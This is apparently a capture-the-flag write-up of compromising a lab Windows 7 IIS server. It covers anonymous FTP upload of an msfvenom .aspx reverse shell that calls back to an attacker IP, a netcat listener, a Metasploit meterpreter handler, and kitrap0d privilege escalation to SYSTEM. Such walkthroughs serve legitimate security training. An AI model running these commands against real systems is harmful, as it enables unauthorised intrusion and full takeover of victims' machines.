Starting off with a nmap scan to determine open ports, thus attack vector !

```bash

Nmap has found that there are two open ports on the victim machine; port 80 & 22. Navigating to the web server reveals that the default pages of IIS are in place. Alternatively, if we check the Burp response, we can see that the *server* header shows the server is indeed "Microsoft IIS/7.5".

Nmap has also found that the FTP service allows anonymous connection. By logging in the service, it's revealed that the root folder of the FTP is the root folder of the IIS server. Trying to upload a file also appeared to be successful, therefore uploading a webshell[^webshell] should allow for command execution.

Generating an `.aspx` formated reverse shell via msfvenom was a great way to get access to the system. 

```bash
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.10 lport=7001 -f aspx -o revshell.aspx
```

After the generation of the reverse shell, uploading it to the system via the FTP service allowed to be executed via navigating to it in the browser.

```bash
$ rlwrap ncat -lnvp 7001 
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7001
Ncat: Listening on 0.0.0.0:7001

```

The use of `rlwrap` allows the use of the arrow keys while using netcat. It is simply a read-line wrapper and is similar to the `stty raw -echo `[^stty] method.  This tool can be downloaded using the package manager in kali simply by typing the below.

```bash
$ sudo apt update && sudo apt install rlwrap -y
```

Checking `systeminfo` for patches, reveals that the windows 7 x86 machine was never updated meaning it is exposed to a lot of privilege escalation attacks. Copying the output of `systeminfo` and pasting it locally, a tool such as "Windows-Exploit-Suggester"[^wes-tool] could be used to check what exploits can be used to attack the system and escalate the privilages.

```bash
$ ./windows-exploit-suggester.py -i ../systeminfo.txt -d 2020-12-06-mssb.xls
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension

[+] systeminfo input file read successfully (ascii)

[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
[*] there are now 179 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 32-bit'

---SNIP---

[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```

The *ms10_015_kitrap0d* can be used to elevate the privilages by exploiting a kernel vulnerability. Metasploit has available module which could this automatically. Repeat the same steps done to generate a generic non-meterpreter payload to create a meterpreter alternative. Afterwards, use *multi/handler* and set the payload you used for the generation of the reverse shell file.

```bash
$ msfconsole -q
msf5 > use multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set lhost 10.10.14.10
lhost => 10.10.14.10

msf5 exploit(multi/handler) > set lport 7001
lport => 7001

msf5 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

msf5 exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.10.14.10:7001 
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.10:7001 -> 10.10.10.5:49166) at 2020-12-22 14:56:22 +0000
```

After obtaining the reverse shell in metasploit, session has to be backgrounded and lastly a search for *kitrap0d* showed the needed module. 

```bash
msf5 exploit(multi/handler) > search kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D
```

Lastly, using the module, setting up the session number of the meterpreter session should allow for the module to successfully complete the exploitation to escalate privileges to *NT AUTHORITY/SYSTEM*. 

```bash
msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 1

msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit

```

Finally, the box was completed and flags can be read.
